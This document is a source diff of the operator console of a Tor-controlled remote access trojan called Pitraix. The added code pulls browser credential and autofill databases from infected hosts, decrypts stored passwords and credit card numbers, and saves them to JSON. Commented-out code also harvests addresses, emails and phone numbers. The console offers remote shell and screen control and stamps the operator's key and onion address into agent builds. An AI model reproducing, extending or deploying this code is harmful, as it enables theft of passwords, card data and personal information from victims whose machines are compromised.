@@ -1,3 +1,14 @@
+/* 
+	Copyright (C) 2022 @MrCypher16 - All Rights Reserved
+	You may use, distribute and modify this code under the
+	terms of the MIT license. 
+	You should have received a copy of the MIT license with
+	this file. If not, please visit: github.com/ThrillQuks/Pitraix
+
+	the above notice does not apply to shit worlders
+*/
+
+
 package main
 
 import (
@@ -30,11 +41,11 @@ import (
 	"os/exec"
 	// "os/signal"
 	"strconv"
-	"runtime"
+	// "runtime"
 	"archive/zip"
 	
-	// "database/sql"
-	// _ "github.com/mattn/go-sqlite3"
+	"database/sql"
+	_ "github.com/mattn/go-sqlite3"
 
 	"github.com/gorilla/websocket"
 	"golang.org/x/net/proxy"
@@ -47,6 +58,7 @@ const (
 	ddosCounter = 25
 	advancedAntiDDos_enabled = false // optional adds protection against targetted ddos, not really needed since v3 address is so long its impossible to bruteforce and ddosers are limited by TOR bandwidth 
 	version = "1.2"
+	debug 	= true
 )
 
 var (
@@ -68,8 +80,8 @@ var (
 	rdpRECVAsyncChn = make(chan []byte)
 	rdpSENTasyncChn = make(chan string)
 	// rdpDone = make(chan bool)
-
-
+	
+	
 	commands = map[string]string {
 		"rdp [index]": "Control screen, mouse and keyboard, can only control 1 host at time",
 		"shell [command]": "Executes a single shell command on host and waits for output",
@@ -119,6 +131,10 @@ type operLogsType struct {
 
 type instruType struct {
 	INSTS []string
+}
+
+type login_DataType struct {
+	Logins []map[string]string 
 }
 
 type t_HST struct {
@@ -227,7 +243,7 @@ func ExportRsaPrivateKeyAsPemStr(privkey *rsa.PrivateKey) string {
     return string(privkey_pem)
 }
 
-func ParseRsaPrivateKeyFromPemStr(privPEM string) (*rsa.PrivateKey, error) {
+func ParseRsaPrivateKeyPEM(privPEM string) (*rsa.PrivateKey, error) {
     block, _ := pem.Decode([]byte(privPEM))
     if block == nil {
         return nil, errors.New("failed to parse PEM")
@@ -241,7 +257,7 @@ func ParseRsaPrivateKeyFromPemStr(privPEM string) (*rsa.PrivateKey, error) {
     return priv, nil
 }
 
-func ExportRsaPublicKeyAsPemStr(pubkey *rsa.PublicKey) (string, error) {
+func ExportRsaPublicKeyAsPEM(pubkey *rsa.PublicKey) (string, error) {
     pubkey_bytes, err := x509.MarshalPKIXPublicKey(pubkey)
     if err != nil {
         return "", err
@@ -579,7 +595,7 @@ func setupTor(path, port, name string, forceSetup bool) string {
 				found = true
 			} else {
 				// fmt.Println(runtime.GOOS)
-				if runtime.GOOS != "linux" {
+				if os.PathSeparator != 47 {
 					y := strings.Index(string(tor), `<a href="tor-win64`)
 					z := strings.TrimSpace(string(tor)[y + 5:y + 70])
 					
@@ -624,8 +640,9 @@ HiddenServicePort 80 127.0.0.1:%s`, filepath.Join(path, name, name + "hid"), por
 	}
 
 
-	if runtime.GOOS != "linux" {
+	if os.PathSeparator != 47 {
 		legacy_doInstru("shellnoop", filepath.Join(path, name, "Tor", torexecName) + " -f " + filepath.Join(path, name, name + "torrc"))
+	
 	} else {
 		os.Setenv("LD_LIBRARY_PATH",  path + "/" + name) // needed for latest linux snitches couldn't figure this one
 		legacy_doInstru("shellnoop", filepath.Join(path, name, torexecName) + " -f " + filepath.Join(path, name, name + "torrc"))
@@ -816,7 +833,7 @@ func legacy_doInstru(ic, iv string) string {
 	var shell string
 	var sec string
 	
-	if runtime.GOOS != "linux" {
+	if os.PathSeparator != 47 {
 		shell = os.Getenv("HOMEDRIVE") + "\\Windows\\System32\\cmd.exe"
 		sec = "/c"
 		
@@ -877,12 +894,557 @@ func doInstru(addr string, inst, hstAES_Key []byte, direct bool) ([]byte, error)
 	return []byte{}, nil
 } 
 
+func extractBrowsersData(addr, key string) {
+	fmt.Printf("\n%s>%s Extracting %s%s%s's browser data..\n", blueColor, endColor, blueColor, addr, endColor)
+
+	hstAES_Key, _ := base64.StdEncoding.DecodeString(key)
+
+	insts_marshalled, _ := json.Marshal([]string{"getwsbrowserkey 1"})
+
+	browserS_onetimeKeyTMP, err := doInstru(addr, insts_marshalled, hstAES_Key, true)
+
+	browserS_onetimeKey := strings.TrimSpace(strings.Replace(string(browserS_onetimeKeyTMP), "<PiTrIaXMaGGi$N$9a1n>", "", -1))
+
+	if err != nil {
+		fmt.Printf("\n%s>%s Host is %soffline%s\n", redColor, endColor, redColor, endColor)
+
+	} else {
+		// fmt.Println("browserS_onetimeKey:", browserS_onetimeKey, err)
+
+		proxyURL, _ := url.Parse("SOCKS5://127.0.0.1:9050")
+
+		wsdialer := websocket.Dialer{
+			Proxy: http.ProxyURL(proxyURL),
+		}
+
+		c, _, err := wsdialer.Dial("ws://" + addr + ".onion/websocket" + browserS_onetimeKey, nil) // websocket.DefaultDialer.Dial("ws://" + addr + ".onion/websocket", NetDial: dialer,)
+		
+		if err != nil {
+			fmt.Printf("\n%s>%s Host closed connection abrubtly %s%s%s\n", redColor, endColor, redColor, err.Error(), endColor)
+
+		} else {
+			defer c.Close()
+
+			ctime := time.Now().String()
+
+			err := c.WriteMessage(websocket.TextMessage, []byte("extract"))
+			if err != nil {
+				fmt.Println("write error:", err)
+
+			} else {
+				os.MkdirAll(filepath.Join("extracted", addr), os.ModePerm)
+
+				for {
+					_, message, err := c.ReadMessage()
+					// fmt.Println(message, string(message), err )
+
+					if err != nil {
+						fmt.Println("read error:", err)
+						break
+
+					} else {
+
+						if strings.HasPrefix(string(message), "error:") {
+							fmt.Println(string(message))
+							break
+						
+						} else if string(message) == "done" {
+							fmt.Println("done")
+							go func(addr string) {
+								time.Sleep(5 * time.Second)
+								files, err := ioutil.ReadDir(filepath.Join("extracted", addr))
+								
+								if err != nil {
+									fmt.Println("error reading directory:", err)
+								
+								}
+								
+								for _, file := range files {
+									fname := file.Name()
+									if filepath.Ext(fname) == ".db" {
+										os.Remove(filepath.Join("extracted", addr, fname))
+										// fmt.Println("err:", err)
+									
+									}
+
+								}
+
+							}(addr)
+
+							break
+							
+						} else {
+							go func(message []byte) {
+								msgSplit := strings.Split(string(message), "|")
+
+								if len(msgSplit) != 4 {
+									fmt.Println("malformed data split", msgSplit, len(msgSplit))
+
+								} else {
+									browserName := msgSplit[0]
+									dataName := msgSplit[1]
+									key, err := base64.StdEncoding.DecodeString(msgSplit[2])
+
+									if err != nil {
+										fmt.Println("malformed key base64", msgSplit[2], err)
+
+									} else {
+										fileData, err := base64.StdEncoding.DecodeString(msgSplit[3])
+
+										if err != nil {
+											fmt.Println("malformed key base64", msgSplit[2], err)
+
+										} else {
+											f, _ := os.Create(filepath.Join("extracted", addr, browserName + "_" + dataName + "_" + ctime) + ".db")
+											f.Write(fileData)
+											f.Close()
+
+											db, err := sql.Open("sqlite3", filepath.Join("extracted", addr, browserName + "_" + dataName + "_" + ctime) + ".db") // "./Login Data.db")
+											if err != nil {
+												fmt.Println("Error opening sqlite database:", err)
+												return 
+											
+											} else {
+												var query string
+												
+												if dataName == "Login Data" {
+													query = "SELECT * FROM logins"
+
+												} else if dataName == "Web Data" {
+													query = "SELECT * FROM credit_cards"
+
+												}
+
+												rows, err := db.Query(query)
+												if err != nil {
+													fmt.Println("Error querying database", err)
+													db.Close()
+												
+												} else {
+													var lGG []map[string]string
+
+													for rows.Next() {
+
+														if dataName == "Login Data" {
+															var (
+																id 		   string
+																origin_url string
+																action_url string
+					
+																username_element string
+																username_value   string
+																password_element string
+					
+																password_value []byte
+																submit_element string
+																signon_realm   string
+																date_created   string
+																password_type  string
+					
+																scheme 	  string
+																time_used string
+																form_data string
+																icon_url  string
+					
+																display_name       string
+																federation_url     string
+																skip_zero_click    string
+																moving_blocked_for string
+																date_last_used 	   string
+					
+																
+																date_password_modified 	 string
+																generation_upload_status string
+																possible_username_pairs  string
+																blacklisted_by_user 	 string
+															
+															)
+					
+															err = rows.Scan(&origin_url, &action_url, &username_element, &username_value, &password_element, &password_value, 
+															&submit_element, &signon_realm, &date_created, &blacklisted_by_user, &scheme, &password_type, &time_used, &form_data, &display_name, &icon_url, &federation_url, &skip_zero_click, &generation_upload_status, &possible_username_pairs, &id, &date_last_used, &moving_blocked_for, &date_password_modified)
+
+															pass, err := decrypt_AES(password_value[15:], password_value[3:15], key)
+
+															if err != nil {
+																fmt.Println("Error decrypting", err)
+																continue
+															}
+				
+															lGG = append(lGG, map[string]string{"URL": origin_url, "Username": username_value, "Password": string(pass)})
+												
+															// fmt.Printf("URL     : %s\nUsername: %s\nPassword: %s\n", origin_url, username_value, string(pass))
+															
+															// if fileData == nil {
+															// 	fmt.Println("ok")
+															// }
+
+														} else if dataName == "Web Data" {
+															var (
+																guid string
+																name_on_card string
+																nickname 	 string
+			
+																expiration_month int
+																expiration_year  int
+			
+																card_number_encrypted []byte
+																date_modified string 
+																origin string
+																use_count int
+																use_date string
+																billing_address_id string
+			
+															)
+			
+															err = rows.Scan(&guid, &name_on_card, &expiration_month, &expiration_year, &card_number_encrypted, &date_modified, &origin, &use_count, &use_date, &billing_address_id, &nickname)
+															
+															ccnumb, err := decrypt_AES(card_number_encrypted[15:], card_number_encrypted[3:15], key)
+															
+															if err != nil {
+																fmt.Println("Error decrypting", err)
+																continue
+															}
+															
+															lGG = append(lGG, map[string]string{"Card name": name_on_card, "Card nickname": nickname, "Expiration date": fmt.Sprintf("%d/%d", expiration_month, expiration_year), "Card number": string(ccnumb)})
+
+														}
+
+													}
+
+													db.Close()
+
+													gb, _ := json.MarshalIndent(lGG, "", " ")
+													f, _ := os.Create(filepath.Join("extracted", addr, browserName + "_" + dataName + "_" + ctime) + ".json")
+													f.Write(gb)
+													f.Close()
+
+												}
+
+											}
+
+										}
+
+									}
+
+								}
+
+							}(message)
+
+
+						}
+					
+					}
+				
+				
+				// fun := []string{
+				// 	"Login Data",
+				// 	"Web Data",
+				// }
+
+				// funi  := 0
+				// dan := false
+				// keys  := []string{}
+				// 		if string(message) == "genius" {
+				// 			// fmt.Println("genius")
+				// 			genius = true
+						
+				// 		} else if string(message) == "yog" {
+				// 			// fmt.Println("yog")
+				// 			break
+				// 		} else {
+				// 			// go func(ctime string, addr string, message []byte){ 
+				// 			// fu := strings.Split(string(message), "|-|")[0]
+
+				// 			// var finalWARP string
+
+
+							
+
+				// 			if genius == false {
+				// 				f, _ := os.Create(filepath.Join("extracted", addr, fun[funi] + "_" + ctime) + ".db")
+				// 				f.Write(message)
+				// 				f.Close()
+
+				// 				if funi == len(fun) - 1 {
+				// 					fmt.Println("new browser ohhh")
+				// 					funi = 0
+				// 				} else {
+				// 					funi++;
+				// 				}
+
+				// 			} else {
+				// 				keys = append(keys, string(message))
+
+				// 			}
+
+
+				// 			// }(ctime addr, message)
+							
+				// 		}
+
+				// 	}
+
+				// }
+
+				// unique_id_browser := map[int]string{
+				// 	0: "Edge",
+				// 	1: "Chrome",
+				// }
+
+				// // var unique_id_counter int = 0
+
+				// for _, eplor := range unique_id_browser {
+				// 	for _, fn := range fun {
+				// 		// fmt.Println(fun)
+				// 		db, err := sql.Open("sqlite3", filepath.Join("extracted", addr, eplor + "_" + fn + "_" + ctime) + ".db") // "./Login Data.db")
+				// 		if err != nil {
+				// 			fmt.Println("Error opening sqlite database:", err)
+				// 			return 
+				// 		} else {
+				// 			var lGG []map[string]string 
+
+				// 			if fn == "Login Data" {
+				// 				rows, err := db.Query("SELECT * FROM logins")
+				// 				if err != nil {
+				// 					fmt.Println("Error querying database", err)
+				// 				} else {
+
+				// 					for rows.Next() {
+				// 						var (
+				// 							id 		   string
+				// 							origin_url string
+				// 							action_url string
+
+				// 							username_element string
+				// 							username_value   string
+				// 							password_element string
+
+				// 							password_value []byte
+				// 							submit_element string
+				// 							signon_realm   string
+				// 							date_created   string
+				// 							password_type  string
+
+				// 							scheme 	  string
+				// 							time_used string
+				// 							form_data string
+				// 							icon_url  string
+
+				// 							display_name       string
+				// 							federation_url     string
+				// 							skip_zero_click    string
+				// 							moving_blocked_for string
+				// 							date_last_used 	   string
+
+											
+				// 							date_password_modified 	 string
+				// 							generation_upload_status string
+				// 							possible_username_pairs  string
+				// 							blacklisted_by_user 	 string
+										
+				// 						)
+
+				// 						err = rows.Scan(&origin_url, &action_url, &username_element, &username_value, &password_element, &password_value, 
+				// 						&submit_element, &signon_realm, &date_created, &blacklisted_by_user, &scheme, &password_type, &time_used, &form_data, &display_name, &icon_url, &federation_url, &skip_zero_click, &generation_upload_status, &possible_username_pairs, &id, &date_last_used, &moving_blocked_for, &date_password_modified)
+										
+				// 						// fmt.Println("Login Data:", err)
+
+				// 						// var lGG login_DataType
+
+				// 						for _, k := range keys {
+				// 							key := []byte(k)
+
+				// 							pass, err := decrypt_AES(password_value[15:], password_value[3:15], key)
+
+				// 							if err != nil {
+				// 								// fmt.Println("Error decrypting", err)
+				// 								continue
+				// 							}
+
+				// 							lGG = append(lGG, map[string]string{"URL": origin_url, "Username": username_value, "Password": string(pass)})
+								
+				// 							// fmt.Printf("URL     : %s\nUsername: %s\nPassword: %s\n", origin_url, username_value, string(pass))
+				// 							break
+											
+				// 						}
+
+										
+				// 					}
+
+				// 				}
+								
+				// 			} else if fn == "Web Data" {
+				// 				rowsNames := []string{"credit_cards", "autofill_profiles", "autofill_profile_names", "autofill_profile_emails", "autofill_profile_phones"}
+
+				// 				for index, rowName := range rowsNames {
+				// 					rows, err := db.Query("SELECT * FROM " + rowName)
+				// 					if err != nil {
+				// 						fmt.Println("Error querying database", err)
+				// 					} else {
+				// 						for rows.Next() {
+				// 							// var encryptedBytes []byte
+				// 							// var lGGmap map[string]string
+
+				// 							if index == 0 {
+				// 								var (
+				// 									guid string
+				// 									name_on_card string
+				// 									nickname 	 string
+
+				// 									expiration_month int
+				// 									expiration_year  int
+
+				// 									card_number_encrypted []byte
+				// 									date_modified string 
+				// 									origin string
+				// 									use_count int
+				// 									use_date string
+				// 									billing_address_id string
+
+				// 								)
+
+				// 								err = rows.Scan(&guid, &name_on_card, &expiration_month, &expiration_year, &card_number_encrypted, &date_modified, &origin, &use_count, &use_date, &billing_address_id, &nickname)
+												
+				// 								// encryptedBytes = card_number_encrypted
+				// 								// lGGmap = map[string]string{"Card name": name_on_card, "Card nickname": nickname, "Expiration date": fmt.Sprintf("%d/%d", expiration_month, expiration_year), "Card number": string(ccnumb)}
+				// 								// fmt.Printf("Card name: %s\nCard nickname: %s\nExpiration date: %d/%d\nCard number: %s", name_on_card, nickname, expiration_month, expiration_year, string(card_number_encrypted))
+
+				// 								for _, k := range keys {
+				// 									key := []byte(k)
+
+				// 									ccnumb, err := decrypt_AES(card_number_encrypted[15:], card_number_encrypted[3:15], key)
+
+				// 									if err != nil {
+				// 										fmt.Println("Error decrypting", err)
+				// 										continue
+				// 									}
+
+				// 									lGG = append(lGG,  map[string]string{"Type": "Credit Card", "Card name": name_on_card, "Card nickname": nickname, "Expiration date": fmt.Sprintf("%d/%d", expiration_month, expiration_year), "Card number": string(ccnumb)})
+				// 									break
+													
+				// 								}
+
+
+				// 							} else if index == 1 {
+				// 								var (
+				// 									guid string
+				// 									company_name   string
+				// 									street_address string
+
+				// 									dependent_locality string
+				// 									city string
+				// 									state string
+				// 									zipcode string
+				// 									sorting_code string
+				// 									country_code string
+				// 									date_modified string
+				// 									origin string 
+				// 									language_code string
+				// 									use_count int
+				// 									use_date string
+				// 									label string
+				// 									disallow_settings_visible_updates int
+				// 								)
+
+				// 								err = rows.Scan(&guid, &company_name, &street_address, &dependent_locality, &city, &state, &zipcode, &sorting_code, &country_code, &date_modified, &origin, &language_code, &use_count, &use_date, &label, &disallow_settings_visible_updates)
+												
+											
+
+				// 								lGG = append(lGG,  map[string]string{"Guid": guid, "Type": "Address", "Organization": company_name, "Street address": street_address, "dependent_locality": dependent_locality, "City": city, "State": state, "Zipcode": zipcode, "Sorting code": sorting_code, "Country code": country_code})
+												
+
+				// 							} else if index == 2 {
+				// 								var (
+				// 									guid string
+				// 									first_name string
+				// 									middle_name string
+				// 									last_name string
+				// 									full_name string
+				// 									honorific_prefix string
+				// 									first_last_name string
+				// 									conjunction_last_name string
+				// 									second_last_name string
+				// 									honorific_prefix_status string
+				// 									first_name_status string
+				// 									middle_name_status string
+				// 									last_name_status string
+				// 									first_last_name_status string
+				// 									conjunction_last_name_status string
+				// 									second_last_name_status string
+				// 									full_name_status string
+				// 									full_name_with_honorific_prefix string
+				// 									full_name_with_honorific_prefix_status string
+				// 								)
+
+				// 								err = rows.Scan(&guid, &first_name, &middle_name, &last_name, &full_name, &honorific_prefix, &first_last_name, &conjunction_last_name, &second_last_name, &honorific_prefix_status, &first_name_status, &middle_name_status, &last_name_status, &first_last_name_status, &conjunction_last_name_status, &second_last_name_status, &full_name_status, &full_name_with_honorific_prefix, &full_name_with_honorific_prefix_status)
+
+				// 								lGG = append(lGG,  map[string]string{"Guid": guid, "Type": "Address", "Full name": full_name})
+											
+				// 							} else if index == 3 {
+				// 								var (
+				// 									guid string
+				// 									email string
+				// 								)
+
+				// 								err = rows.Scan(&guid, &email)
+
+				// 								lGG = append(lGG,  map[string]string{"Guid": guid, "Type": "Address", "Email": email})
+											
+				// 							} else if index == 4 {
+				// 								var (
+				// 									guid string
+				// 									number string
+				// 								)
+
+				// 								err = rows.Scan(&guid, &number)
+
+				// 								lGG = append(lGG,  map[string]string{"Guid": guid, "Type": "Address", "Phone number": number})
+
+				// 							}
+
+				// 						}
+										
+				// 					}
+								
+				// 				}
+
+				// 			}
+
+				// 			db.Close()
+				// 			os.Remove(filepath.Join("extracted", addr, eplor + "_" + fn + "_" + ctime) + ".db")
+
+				// 			gg, _ := json.MarshalIndent(lGG, "", " ")
+				// 			f, _ := os.Create(filepath.Join("extracted", addr, eplor + "_" + fn + "_" + ctime) + ".json")
+				// 			f.Write(gg)
+				// 			f.Close()
+
+				// 			fmt.Printf("\n%s>%s Extracted %s%d%s %s\n", blueColor, endColor, blueColor, len(lGG), endColor, fn)
+
+				// 		}
+
+						// unique_id_counter++
+
+					// }
+
+				}
+
+				// fmt.Println(keys, len(keys))
+
+			}
+
+
+			
+		}
+	
+	}
+
+}
 
 func (modules *modules_type) loadModules(path string, hrd *t_HST) {
 	files, _ := ioutil.ReadDir(path)
 	
 	if len(files) > 0 {
-		fmt.Printf("%s>%s Loading %sModules%s..\n\n", yellowColor, endColor, redColor, endColor)
+		fmt.Printf("%s>%s Loading %sModules%s..\n", yellowColor, endColor, redColor, endColor)
 
 	}
 
@@ -1109,8 +1671,10 @@ func main() {
 		blueColor   = "\x1b[34m"
 		yellowColor = "\x1b[93m"
 		endColor    = "\x1b[0m"
+		
 	}
-	fmt.Printf("%s>%s Loading %sPitraix%s..\n\n", yellowColor, endColor, redColor, endColor)
+
+	fmt.Printf("%s>%s Loading %sPitraix%s..\n", yellowColor, endColor, redColor, endColor)
 	currentPath, _ := os.Executable()
 
 	agentAddress := setupTor(filepath.Dir(currentPath), "1337", "tor", false)
@@ -1127,12 +1691,20 @@ func main() {
 
 	var operPrivKey *rsa.PrivateKey
 	operPrivKeyTmp1, err := readFile("OPER_PrivateKey.pitraix")
+	
+	var firstStartup = false
 	if err != nil {
+		firstStartup = true
+
 		fmt.Println(yellowColor + ">" + endColor + " First startup detected! Generating RSA keys..")
-		priv, pub := GenerateRsaKeyPair()
+
+		// priv, pub := GenerateRsaKeyPair()
+
+		priv, _ := GenerateRsaKeyPair()
         priv_pem := strings.TrimSpace(ExportRsaPrivateKeyAsPemStr(priv))
-        pub_pemR, _ := ExportRsaPublicKeyAsPemStr(pub)
-        pub_pem := strings.TrimSpace(pub_pemR)
+
+        // pub_pemR, _ := ExportRsaPublicKeyAsPemStr(pub)
+        // pub_pem := strings.TrimSpace(pub_pemR)
 		
 		operPrivKey = priv
 
@@ -1142,47 +1714,87 @@ func main() {
 
 
 		// fmt.Println("wrote:", pub_pem)
-        f, _ = os.Create("OPER_PublicKey.pitraix")
-        f.WriteString(pub_pem)
-        f.Close()
-
-        for _, v := range []string{"lyst_windows.go", "lyst_windows.exe", "lyst_linux.go", "lyst_linux"} {       
-			file, err := os.Open(v)
-			if err != nil {
-				fmt.Printf("%sWarning >%s Make sure you have %s%s%s in the same folder\n", yellowColor, endColor, yellowColor, v, endColor)
-			} else {
-					fs, _ := file.Stat()
-					b := make([]byte, fs.Size())
-
-					for {
-						_, err := file.Read(b)
-						if err != nil {
-							break
-						}
-					}
-					file.Close()
-
-					nb := bytes.Replace(b, []byte("RXLCJAFYNIYZRZMWTZNMIYVSKFUAYJFSZUDIKNRNPMHOTDVSCRGLYTATTRGKGHPWDUMGEUHTTMEBAJRNEOYRDDUDMNWGBWEOASVYVGZZCRXIRUZIFBPAVMZZEWATVSYQNYDJLZPSMYGTOPUSPBRASSWWFOQGWZLRCWQMVKCXTUFGSIVPDKCLLWDIFAWWCVXBXUKOKALCPQKBWGRFTFGZQGZUOAHOZYSSWOBCZKEBLWFBJBQZTXCGZOJIDCYHGWSJGCNAVXAIZUDPPUIIFWYZKYASBNWDVIHCOSYNSTWENAJJSUPXAUSVSXYTVDNYGMVTHAQAURQVKTWYOBOSLFKYWOSPZJTRKQLLOPJTGNOXGGHCTNATRCBGVAIMFWSSTRJSJACBJFQRUJRGESXYSSIUIYWFEDZHSPEEIHSRCFAOCWRRQJMDOOFZOLNPXWDUWXATEBIDKFMZBMSNMPMCYNJNGQGARSVPAWWFDVTGNEXVIRZVXJNXIIWEZKSGPERFKUXTFDHMRSBXUVDQJSUCLMIHYFVRIZRJKSLBEWKDVYFXMDMELBTLCGORDJFJPWNDEXVNXVVXYTAAMYKWYSHZDNVAZYTCBYOLBIJAWBGKVTHWVOEEULFWXEZQNSCWVRMUGIBYUHUIKEVMPDAOMSKXAXZSEHCYIMIIAFLFBBFMTZMOIAHKPUVXNKIUGWETMFSPEEXKOGPCQRLKSGMLZTAWKFDMCQLGPZFDDOHHKPIBOJCKDIGAKWYADJQTOFHWPXKBGYELBQELQULTTIQNJFCBHJAUYCEUOIZAFOVEKDQAKLW"), []byte(pub_pem), -1)
-					// nb = bytes.Replace(b, []byte("~~YOUR RSA PRIVATE KEY - RUN SETUPCRYPTO.GO~~"), []byte(priv_pem), 1)
-					nb = bytes.Replace(nb, []byte("SNOGOYXKJWNZRYZFLHRJBLAVLLNXLMNBDDPJPJGKMJJDYDLVQSUIDPZA"), []byte(agentAddress), -1)
-
-					f, _ := os.Create(v)
-					f.Write(nb)
-					f.Close()
-			}
-        }
-		fmt.Println(greenColor + ">" + endColor + " Done.")
+        // f, _ = os.Create("OPER_PublicKey.pitraix")
+        // f.WriteString(pub_pem)
+        // f.Close()
+		
 		fmt.Println(yellowColor + ">" + endColor + " As this is your first time, Remember that instructions don't execute as you write them! you have to confirm sending by typing \"instru\" after you have entered all of desired instruction sequence")
 
 	} else {
-		operPrivKey, err = ParseRsaPrivateKeyFromPemStr(string(operPrivKeyTmp1))
+		operPrivKey, err = ParseRsaPrivateKeyPEM(string(operPrivKeyTmp1))
+
 		if err != nil {
 			fmt.Println("Error parsing OPER_PrivateKey:", err)
 			os.Remove("OPER_PrivateKey")
 			os.Exit(0)
+
 		}
+
 	}
+
+
+	operPubKey := operPrivKey.PublicKey
+
+	operPubKeyPEM, err := ExportRsaPublicKeyAsPEM(&operPubKey)
 	
+	if err != nil {
+		fmt.Printf("\n%s>%s There was %serror%s parsing Public-Key this indicates problem with your Private-key. Please open issue on github: https://github.com/ThrillQuks/Pitraix/issues\nInclude this error: %s%s%s\n", redColor, endColor, redColor, endColor, redColor, err.Error(), endColor)
+		// os.Exit(0)
+
+	} else {
+
+		// operPubKeyTmp2 := strings.TrimSpace(string(operPubKeyTmp1))
+		// operPubKey, err = ParseRsaPublicKeyPEM(string(operPubKeyTmp2))
+
+		// if err != nil {
+		// 	fmt.Printf("\n%s>%s There was %serror%s parsing publicKey file. Please open issue on github: https://github.com/ThrillQuks/Pitraix/issues\nInclude this error: %s%s%s\n", redColor, endColor, redColor, endColor, redColor, err.Error(), endColor)
+		// 	os.Remove("OPER_PublicKey")
+		// 	os.Exit(0)
+
+		// }
+
+		
+
+
+		for _, v := range []string{"lyst_windows.go", "lyst_windows.exe", "lyst_linux.go", "lyst_linux"} {       
+			file, err := os.Open(v)
+
+			if err != nil {
+				if firstStartup == true {
+					fmt.Printf("%sWarning >%s Make sure you have %s%s%s in the same folder\n", yellowColor, endColor, yellowColor, v, endColor)
+				
+				}
+
+			} else {
+				fs, _ := file.Stat()
+				b := make([]byte, fs.Size())
+
+				for {
+					_, err := file.Read(b)
+					if err != nil {
+						break
+					}
+				}
+				
+				file.Close()
+
+				nb := bytes.Replace(b, []byte(".DONT.CHANGE.THIS.NMIYVSKFUAYJFSZUDIKNRNPMHOTDVSCRGLYTATTRGKGHPWDUMGEUHTTMEBAJRNEOYRDDUDMNWGBWEOASVYVGZZCRXIRUZIFBPAVMZZEWATVSYQNYDJLZPSMYGTOPUSPBRASSWWFOQGWZLRCWQMVKCXTUFGSIVPDKCLLWDIFAWWCVXBXUKOKALCPQKBWGRFTFGZQGZUOAHOZYSSWOBCZKEBLWFBJBQZTXCGZOJIDCYHGWSJGCNAVXAIZUDPPUIIFWYZKYASBNWDVIHCOSYNSTWENAJJSUPXAUSVSXYTVDNYGMVTHAQAURQVKTWYOBOSLFKYWOSPZJTRKQLLOPJTGNOXGGHCTNATRCBGVAIMFWSSTRJSJACBJFQRUJRGESXYSSIUIYWFEDZHSPEEIHSRCFAOCWRRQJMDOOFZOLNPXWDUWXATEBIDKFMZBMSNMPMCYNJNGQGARSVPAWWFDVTGNEXVIRZVXJNXIIWEZKSGPERFKUXTFDHMRSBXUVDQJSUCLMIHYFVRIZRJKSLBEWKDVYFXMDMELBTLCGORDJFJPWNDEXVNXVVXYTAAMYKWYSHZDNVAZYTCBYOLBIJAWBGKVTHWVOEEULFWXEZQNSCWVRMUGIBYUHUIKEVMPDAOMSKXAXZSEHCYIMIIAFLFBBFMTZMOIAHKPUVXNKIUGWETMFSPEEXKOGPCQRLKSGMLZTAWKFDMCQLGPZFDDOHHKPIBOJCKDIGAKWYADJQTOFHWPXKBGYELBQELQULTTIQNJFCBHJAUYCEUOIZAFOVEKDQAKLW"), []byte(operPubKeyPEM), -1)
+				// nb = bytes.Replace(b, []byte("~~YOUR RSA PRIVATE KEY - RUN SETUPCRYPTO.GO~~"), []byte(priv_pem), 1)
+				nb = bytes.Replace(nb, []byte(".DONT.CHANGE.THIS.RJBLAVLLNXLMNBDDPJPJGKMJJDYDLVQSUIDPZA"), []byte(agentAddress), -1)
+
+				f, _ := os.Create(v)
+				f.Write(nb)
+				f.Close()
+			}
+		
+		}
+		
+	}
+
+	if firstStartup == true && operPrivKey != nil {
+		fmt.Println(greenColor + ">" + endColor + " Done.")
+	}
+
 	go logUpdaterAsync()
 
 	os.MkdirAll("modules", os.ModePerm)
@@ -1196,24 +1808,32 @@ func main() {
 
 
 	// This will fetch latest version over TOR
-	// var noerror = true
-	// for i := 0; i < 6; i++ {
-	// 	versionCheck, err := getRequest("https://raw.githubusercontent.com/ThrillQuks/Pitraix/main/version.txt", true, -1)
-	// 	if err != nil {
-	// 		noerror = false
-	// 	} else {
-	// 		noerror = true
-	// 		if strings.TrimSpace(string(versionCheck)) != version {
-	// 			fmt.Printf("%s>%s New verison (fetched over TOR) is %savailable%s! Please update as %ssoon%s as you can.\n", redColor, endColor, greenColor, endColor, redColor, endColor)
-	// 		}
-	// 		break
-	// 	}
-	// 	time.Sleep(2 * time.Second)
+	if debug == false {
+		var noerror = true
 
-	// }
-	// if noerror == false {
-	// 	fmt.Printf("%s>%s There was %serror%s fetching latest version information over %sTOR %s%s\n", redColor, endColor, redColor, endColor, redColor, err.Error(), endColor)
-	// }
+		for i := 0; i < 6; i++ {
+			versionCheck, err := getRequest("https://raw.githubusercontent.com/ThrillQuks/Pitraix/main/version.txt", true, -1)
+			if err != nil {
+				noerror = false
+
+			} else {
+				noerror = true
+				if strings.TrimSpace(string(versionCheck)) != version {
+					fmt.Printf("%s>%s New verison (fetched over TOR) is %savailable%s! Please update as %ssoon%s as you can.\n", redColor, endColor, greenColor, endColor, redColor, endColor)
+				}
+				break
+
+			}
+			time.Sleep(2 * time.Second)
+
+		}
+
+		if noerror == false {
+			fmt.Printf("%s>%s There was %serror%s fetching latest version information over %sTOR %s%s\n", redColor, endColor, redColor, endColor, redColor, err.Error(), endColor)
+		
+		}
+
+	}
 
 
 	// log("started", "pitrarix has loaded")
@@ -1263,155 +1883,162 @@ func main() {
 				hrd.Vendor 	 = append(hrd.Vendor  , newHST.Vendor)
 				hrd.Model 	 = append(hrd.Model	  , newHST.Model)
 				hrd.ContactD = append(hrd.ContactD, newHST.ContactD)
-				hrd.AV		 = append(hrd.AV, newHST.AV)
+				hrd.AV		 = append(hrd.AV      , newHST.AV)
 
-				hrd.Routes 	 = append(hrd.Routes, []int{})
+				hrd.Routes 	 = append(hrd.Routes  , []int{})
 
-				hrd.Key 	 = append(hrd.Key, newHST.Key)
+				hrd.Key 	 = append(hrd.Key   , newHST.Key)
 				hrd.RasKey   = append(hrd.RasKey, newHST.RasKey)
 				
-				jsonDump, _ := json.MarshalIndent(hrd, "", " ")
-				f, err := os.Create("hostring.json")
+				jsonDump, err := json.MarshalIndent(hrd, "", " ")
 
 				if err != nil {
-					fmt.Printf("\n%s>%s There was %serror%s creating hostring file. Please open issue on github: https://github.com/ThrillQuks/Pitraix/issues\n", redColor, endColor, redColor, endColor)
-
+					fmt.Printf("\n%s>%s There was %serror%s marshalling new host. This could be an attack. %s%s%s\n", redColor, endColor, redColor, endColor, redColor, err.Error(), endColor)
+				
 				} else {
-					f.Write(jsonDump)
-					fmt.Printf("\n\n%s>%s New host register! Host count is now %s%d%s\n\n", greenColor, endColor, greenColor, len(hostring_d.Address), endColor)
-					f.Close()
-					
-					// if auto_spread == true {
-					// 	go func(addr string, key string) {
